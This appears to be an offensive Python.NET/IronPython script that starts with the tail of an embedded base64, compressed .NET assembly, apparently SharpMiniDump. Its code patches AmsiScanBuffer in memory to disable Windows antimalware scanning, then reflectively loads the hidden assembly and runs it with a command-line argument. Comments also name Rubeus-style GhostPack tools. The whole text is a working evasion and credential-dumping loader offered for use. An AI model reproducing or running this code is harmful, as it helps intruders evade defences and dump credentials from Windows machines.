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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpMiniDump.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()